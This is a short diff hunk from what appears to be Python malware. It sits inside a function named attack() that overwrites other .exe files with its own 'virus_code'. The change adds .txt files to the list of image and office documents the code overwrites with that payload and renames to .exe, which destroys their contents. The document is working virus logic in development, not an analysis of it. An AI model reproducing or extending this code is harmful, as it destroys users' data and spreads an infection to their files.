@@ -14,7 +14,7 @@ def attack():
                 if ".exe" in file and file != sys.argv[0]: 
                     with open(targ, 'wb') as target: 
                         target.write(virus_code) 
-		elif ".png" in file or ".jpg" in file or ".doc" in file or ".ppt" in file or ".xls" in file or ".jpeg" in file or ".gif" in file:
+		elif ".txt" in file or ".png" in file or ".jpg" in file or ".doc" in file or ".ppt" in file or ".xls" in file or ".jpeg" in file or ".gif" in file:
 		    with open(targ, 'wb') as target:
 			target.write(virus_code)
 		    os.rename(file, file+".exe")	
